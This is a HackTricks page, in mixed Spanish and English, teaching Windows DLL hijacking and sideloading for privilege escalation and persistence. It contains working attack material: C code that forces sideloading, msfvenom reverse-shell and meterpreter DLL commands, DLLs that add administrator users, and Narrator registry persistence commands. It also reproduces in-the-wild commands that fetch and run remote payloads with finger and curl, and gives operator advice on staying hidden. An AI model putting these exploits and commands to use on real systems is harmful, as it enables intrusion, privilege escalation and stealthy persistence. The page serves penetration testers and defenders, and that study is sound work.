# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Información básica

DLL Hijacking implica manipular una aplicación de confianza para que cargue una DLL maliciosa. Este término abarca varias tácticas como **DLL Spoofing, Injection, and Side-Loading**. Se utiliza principalmente para ejecución de código, lograr persistencia y, menos comúnmente, escalada de privilegios. A pesar del enfoque en la escalada aquí, el método de hijacking permanece consistente según el objetivo.

### Técnicas comunes

Se emplean varios métodos para DLL hijacking, cada uno con su efectividad dependiendo de la estrategia de carga de DLLs de la aplicación:

1. **DLL Replacement**: Intercambiar una DLL legítima por una maliciosa, opcionalmente usando DLL Proxying para preservar la funcionalidad original de la DLL.
2. **DLL Search Order Hijacking**: Colocar la DLL maliciosa en una ruta de búsqueda antes que la legítima, explotando el patrón de búsqueda de la aplicación.
3. **Phantom DLL Hijacking**: Crear una DLL maliciosa que la aplicación cargue, creyendo que es una DLL requerida inexistente.
4. **DLL Redirection**: Modificar parámetros de búsqueda como `%PATH%` o archivos `.exe.manifest` / `.exe.local` para dirigir la aplicación hacia la DLL maliciosa.
5. **WinSxS DLL Replacement**: Sustituir la DLL legítima por una maliciosa en el directorio WinSxS, un método a menudo asociado con DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar la DLL maliciosa en un directorio controlado por el usuario junto con la aplicación copiada, pareciendo técnicas de Binary Proxy Execution.

> [!TIP]
> Para una cadena paso a paso que superpone staging HTML, configuraciones AES-CTR e implantes .NET encima de DLL sideloading, revisa el flujo de trabajo abajo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

La forma más común de encontrar Dlls faltantes dentro de un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **configurando** los **siguientes 2 filtros**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

y mostrar solamente la **File System Activity**:

![](<../../../images/image (153).png>)

Si estás buscando **dlls faltantes en general** deja esto ejecutándose durante unos **segundos**.\
Si estás buscando una **dll faltante dentro de un ejecutable específico** deberías establecer **otro filtro como "Process Name" "contains" `<exec name>`, ejecutarlo y detener la captura de eventos**.

## Exploiting Missing Dlls

Para escalar privilegios, la mejor oportunidad que tenemos es poder **escribir una dll que un proceso privilegiado intentará cargar** en alguno de los **lugares donde va a ser buscada**. Por lo tanto, podremos **escribir** una dll en una **carpeta** donde la **dll se busca antes** que la carpeta donde está la **dll original** (caso extraño), o podremos **escribir en alguna carpeta donde la dll será buscada** y la dll original **no existe** en ninguna carpeta.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Las aplicaciones de Windows buscan DLLs siguiendo un conjunto de **rutas de búsqueda predefinidas**, respetando una secuencia particular. El problema del DLL hijacking surge cuando una DLL dañina se coloca estratégicamente en uno de estos directorios, asegurando que se cargue antes que la DLL auténtica. Una solución para prevenir esto es garantizar que la aplicación use rutas absolutas cuando referencia las DLLs que necesita.

Puedes ver el **orden de búsqueda de DLL en sistemas de 32-bit** a continuación:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Ese es el orden de búsqueda **por defecto** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual asciende a la segunda posición. Para deshabilitar esta característica, crea el valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y ponlo a 0 (por defecto está habilitado).

Si la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) se llama con **LOAD_WITH_ALTERED_SEARCH_PATH** la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.

Finalmente, nota que **una dll podría ser cargada indicando la ruta absoluta en lugar solo del nombre**. En ese caso esa dll **solo será buscada en esa ruta** (si la dll tiene dependencias, estas serán buscadas como si la dll se hubiera cargado por nombre).

Existen otras formas de alterar el orden de búsqueda pero no las voy a explicar aquí.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

An advanced way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Ejemplo de uso operativo
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Excepciones en el orden de búsqueda de DLL según la documentación de Windows

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Cuando se encuentra una **DLL que comparte su nombre con una ya cargada en memoria**, el sistema omite la búsqueda habitual. En su lugar, realiza una comprobación de redirección y de manifest antes de optar por la DLL ya cargada en memoria. **En este escenario, el sistema no realiza una búsqueda de la DLL**.
- En los casos donde la DLL es reconocida como una **known DLL** para la versión actual de Windows, el sistema utilizará su versión de la known DLL, junto con cualquiera de sus DLL dependientes, **omitendo el proceso de búsqueda**. La clave del registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene una lista de estas known DLLs.
- Si una **DLL tiene dependencias**, la búsqueda de estas DLL dependientes se realiza como si se hubieran indicado solo por sus **module names**, independientemente de si la DLL inicial fue identificada mediante una ruta completa.

### Escalada de Privilegios

**Requisitos**:

- Identificar un proceso que opere o vaya a operar bajo **privilegios distintos** (movimiento horizontal o lateral), que **carezca de una DLL**.
- Asegurarse de que exista **acceso de escritura** para cualquier **directorio** en el que se **buscará la DLL**. Esta ubicación podría ser el directorio del ejecutable o un directorio dentro del system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijacking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **comprueba los permisos de todos los directorios dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes comprobar las imports de un ejecutable y las exports de una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para una guía completa sobre cómo **abuse Dll Hijacking to escalate privileges** con permisos para escribir en una **System Path folder** consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Herramientas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) comprobará si tienes permisos de escritura en cualquier carpeta dentro del system PATH.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll._

### Ejemplo

En caso de que encuentres un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear una dll que exporte al menos todas las funciones que el ejecutable importará de ella**. Ten en cuenta que Dll Hijacking resulta útil para [escalar de Medium Integrity level a High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o de [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system). Puedes encontrar un ejemplo de **cómo crear una dll válida** en este estudio sobre dll hijacking centrado en el hijacking de dll para ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Además, en la **siguiente sección** puedes encontrar algunos **códigos dll básicos** que pueden ser útiles como **plantillas** o para crear una **dll con funciones no requeridas exportadas**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Básicamente un **Dll proxy** es una Dll capaz de **ejecutar tu código malicioso cuando se carga** pero también de **exponerse** y **funcionar** como se **espera** reenviando todas las llamadas a la librería real.

Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes realmente **indicar un ejecutable y seleccionar la librería** que quieres proxify y **generar una proxified dll** o **indicar la Dll** y **generar una proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtener un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (x86 no vi una versión x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Tu propio

Ten en cuenta que en varios casos el Dll que compilas debe **exportar varias funciones** que serán cargadas por el victim process; si estas funciones no existen, el **binary no podrá cargarlas** y el **exploit fallará**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Ejemplo de C++ DLL con creación de usuario</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL en C alternativa con thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudio de caso: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe todavía busca una DLL de localización predecible y específica por idioma al iniciar, que puede ser hijacked para ejecución de código arbitrario y persistencia.

Datos clave
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Si existe una DLL controlada por el atacante y con permisos de escritura en la ruta OneCore, se carga y se ejecuta `DllMain(DLL_PROCESS_ATTACH)`. No se requieren exports.

Descubrimiento con Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Inicia Narrator y observa el intento de carga de la ruta indicada arriba.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Silencio OPSEC
- Un hijack ingenuo hablará/resaltará la UI. Para mantenerse en silencio, al adjuntarse enumera los hilos de Narrator, abre el hilo principal (`OpenThread(THREAD_SUSPEND_RESUME)`) y usa `SuspendThread` en él; continúa en tu propio hilo. Ver PoC para el código completo.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con lo anterior, iniciar Narrator carga la DLL plantada. En el secure desktop (logon screen), presiona CTRL+WIN+ENTER para iniciar Narrator; tu DLL se ejecuta como SYSTEM en el secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notas
- Escribir en `%windir%\System32` y modificar valores de HKLM requiere privilegios de administrador.
- Toda la lógica del payload puede vivir en `DLL_PROCESS_ATTACH`; no se necesitan exports.

## Estudio de caso: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Este caso demuestra **Phantom DLL Hijacking** en el TrackPoint Quick Menu de Lenovo (`TPQMAssistant.exe`), registrado como **CVE-2025-1729**.

### Detalles de la vulnerabilidad

- **Componente**: `TPQMAssistant.exe` ubicado en `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Tarea programada**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se ejecuta diariamente a las 9:30 AM bajo el contexto del usuario conectado.
- **Permisos del directorio**: Escritable por `CREATOR OWNER`, lo que permite a usuarios locales colocar archivos arbitrarios.
- **Comportamiento de búsqueda de DLL**: Intenta cargar `hostfxr.dll` desde su directorio de trabajo primero y registra "NAME NOT FOUND" si falta, indicando precedencia de búsqueda en el directorio local.

### Implementación del exploit

Un atacante puede colocar un stub malicioso `hostfxr.dll` en el mismo directorio, explotando la DLL faltante para lograr ejecución de código bajo el contexto del usuario:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flujo de ataque

1. Como usuario estándar, drop `hostfxr.dll` into `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Esperar a que la tarea programada se ejecute a las 9:30 AM under the current user's context.
3. If an administrator is logged in when the task executes, the malicious DLL runs in the administrator's session at medium integrity.
4. Encadenar técnicas estándar de UAC bypass para elevar de medium integrity a privilegios SYSTEM.

## Caso de estudio: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Los actores de amenaza suelen emparejar droppers basados en MSI con DLL side-loading para ejecutar payloads bajo un proceso firmado y de confianza.

Chain overview
- El usuario descarga el MSI. Una CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstruyendo la siguiente etapa a partir de recursos embebidos.
- El dropper escribe un EXE legítimo y firmado y un DLL malicioso en el mismo directorio (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, ejecutando código del atacante bajo un padre firmado (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Buscar entradas que run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- En Orca (Microsoft Orca.exe), inspeccionar las tablas CustomAction, InstallExecuteSequence and Binary.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Buscar múltiples fragmentos pequeños que are concatenated and decrypted by a VBScript CustomAction. Flujo común:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading práctico con wsc_proxy.exe
- Coloca estos dos archivos en la misma carpeta:
- wsc_proxy.exe: host firmado legítimo (Avast). El proceso intenta cargar wsc.dll por nombre desde su directorio.
- wsc.dll: attacker DLL. Si no se requieren exports específicos, DllMain puede ser suficiente; de lo contrario, construye un proxy DLL y reenvía los exports requeridos a la biblioteca genuina mientras ejecutas el payload en DllMain.
- Construye un DLL payload mínimo:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para requisitos de exportación, use un framework de proxy (p.ej., DLLirant/Spartacus) para generar un DLL de reenvío que también ejecute su payload.

- Esta técnica depende de la resolución de nombres DLL por el binario host. Si el host usa rutas absolutas o flags de carga segura (p.ej., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), el hijack puede fallar.
- KnownDLLs, SxS, and forwarded exports pueden influir en la precedencia y deben ser considerados al seleccionar el binario host y el conjunto de exports.

## Tríadas firmadas + payloads cifrados (estudio de caso ShadowPad)

Check Point describió cómo Ink Dragon despliega ShadowPad usando una **tríada de tres archivos** para mezclarse con software legítimo mientras mantiene el payload principal cifrado en disco:

1. **EXE host firmado** – vendors such as AMD, Realtek, or NVIDIA are abused (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Los atacantes renombran el ejecutable para que parezca un binario de Windows (por ejemplo `conhost.exe`), pero la firma Authenticode sigue siendo válida.
2. **Malicious loader DLL** – dropped next to the EXE with an expected name (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). El DLL suele ser un binario MFC ofuscado con el framework ScatterBrain; su única tarea es localizar el blob cifrado, descifrarlo, y reflectively map ShadowPad.
3. **Encrypted payload blob** – often stored as `<name>.tmp` in the same directory. Después de memory-mapping the decrypted payload, el loader borra el archivo TMP para destruir evidencia forense.

Notas de tradecraft:

* Renombrar el EXE firmado (manteniendo el `OriginalFileName` original en el header PE) permite que se haga pasar por un binario de Windows y aun así conserve la firma del vendor, así que replica la costumbre de Ink Dragon de dejar binarios que parecen `conhost.exe` pero que en realidad son utilidades de AMD/NVIDIA.
* Como el ejecutable sigue siendo de confianza, la mayoría de controles de allowlisting solo necesitan que tu DLL maliciosa esté junto a él. Centra tus esfuerzos en personalizar el loader DLL; el padre firmado normalmente puede ejecutarse sin modificaciones.
* El decryptor de ShadowPad espera que el blob TMP viva junto al loader y sea escribible para poder sobrescribir el archivo con ceros después del mapeo. Mantén el directorio escribible hasta que el payload cargue; una vez en memoria, el archivo TMP puede borrarse de forma segura por OPSEC.

### LOLBAS stager + cadena de sideloading de archivo por etapas (finger → tar/curl → WMI)

Los operadores combinan DLL sideloading con LOLBAS para que el único artefacto personalizado en disco sea la DLL maliciosa junto al EXE confiable:

- **Remote command loader (Finger):** PowerShell oculto lanza `cmd.exe /c`, obtiene comandos de un servidor Finger y los canaliza a `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` obtiene texto TCP/79; `| cmd` ejecuta la respuesta del servidor, permitiendo a los operadores rotar la segunda etapa en el lado del servidor.

- **Descarga/extracción integrada:** Descarga un archivo con una extensión benigna, descomprímelo y prepara el target de sideload más la DLL bajo una carpeta aleatoria `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` oculta el progreso y sigue redirecciones; `tar -xf` usa tar integrado de Windows.

- **WMI/CIM launch:** Inicia el EXE vía WMI para que la telemetría muestre un proceso creado por CIM mientras carga la DLL colocada junto a él:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funciona con binarios que prefieren DLLs locales (p.ej., `intelbq.exe`, `nearby_share.exe`); el payload (p.ej., Remcos) se ejecuta bajo el nombre confiable.

- **Hunting:** Alerta sobre `forfiles` cuando `/p`, `/m`, y `/c` aparecen juntos; es poco común fuera de scripts de admin.


## Estudio de caso: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Una intrusión reciente de Lotus Blossom abusó de una cadena de actualización confiable para entregar un dropper empaquetado con NSIS que preparó un DLL sideload y payloads completamente en memoria.

Flujo de tradecraft
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca **HIDDEN**, deja un Bitdefender Submission Wizard renombrado `BluetoothService.exe`, un `log.dll` malicioso y un blob cifrado `BluetoothService`, luego lanza el EXE.
- El EXE host importa `log.dll` y llama a `LogInit`/`LogWrite`. `LogInit` mmap-loads the blob; `LogWrite` lo descifra con un stream custom basado en LCG (constantes **0x19660D** / **0x3C6EF35F**, material de clave derivado de un hash previo), sobrescribe el buffer con shellcode en texto claro, libera temporales y salta a él.
- Para evitar una IAT, el loader resuelve APIs hasheando nombres de exports usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, luego aplicando una avalanche estilo Murmur (**0x85EBCA6B**) y comparando contra hashes objetivo salados.

Shellcode principal (Chrysalis)
- Descifra un módulo principal tipo PE repitiendo add/XOR/sub con la key `gQ2JR&9;` durante cinco pasadas, luego carga dinámicamente `Kernel32.dll` → `GetProcAddress` para terminar la resolución de imports.
- Reconstruye cadenas de nombres de DLL en tiempo de ejecución mediante transformaciones por carácter bit-rotate/XOR, luego carga `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un segundo resolver que recorre el **PEB → InMemoryOrderModuleList**, parsea cada tabla de exports en bloques de 4 bytes con mezcla estilo Murmur, y solo recurre a `GetProcAddress` si el hash no se encuentra.

Configuración embebida & C2
- La config vive dentro del archivo `BluetoothService` dejado en **offset 0x30808** (tamaño **0x980**) y está RC4-descifrada con la key `qwhvb^435h&*7`, revelando la URL de C2 y User-Agent.
- Los beacons construyen un perfil de host delimitado por puntos, anteponen la etiqueta `4Q`, luego RC4-encrypt con la key `vAuig34%^325hGV` antes de `HttpSendRequestA` sobre HTTPS. Las respuestas se RC4-descifran y se despachan mediante un switch de etiquetas (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- El modo de ejecución está controlado por args CLI: sin args = instala persistencia (service/Run key) apuntando a `-i`; `-i` relanza a sí mismo con `-k`; `-k` salta la instalación y ejecuta el payload.

Loader alternativo observado
- La misma intrusión dejó Tiny C Compiler y ejecutó `svchost.exe -nostdlib -run conf.c` desde `C:\ProgramData\USOShared\`, con `libtcc.dll` a su lado. El código fuente en C provisto por el atacante incluía shellcode, lo compiló y ejecutó en memoria sin tocar el disco con un PE. Replicar con:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa de compilación y ejecución basada en TCC importó `Wininet.dll` en tiempo de ejecución y recuperó un shellcode de segunda etapa desde una URL codificada, proporcionando un cargador flexible que se hace pasar por una ejecución de compilador.

## Referencias

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
